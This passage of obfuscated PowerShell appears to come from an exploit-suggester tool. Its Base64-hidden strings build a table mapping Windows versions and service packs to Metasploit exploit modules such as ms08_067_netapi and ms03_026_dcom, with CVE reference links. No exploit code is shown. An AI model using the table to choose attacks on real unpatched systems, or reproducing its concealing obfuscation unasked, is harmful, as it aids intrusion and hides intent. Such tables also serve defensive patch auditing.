        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA=')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADUAXwAwADMAOQBfAHAAbgBwAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADEAOQA4ADMA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        ${/==\/============}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
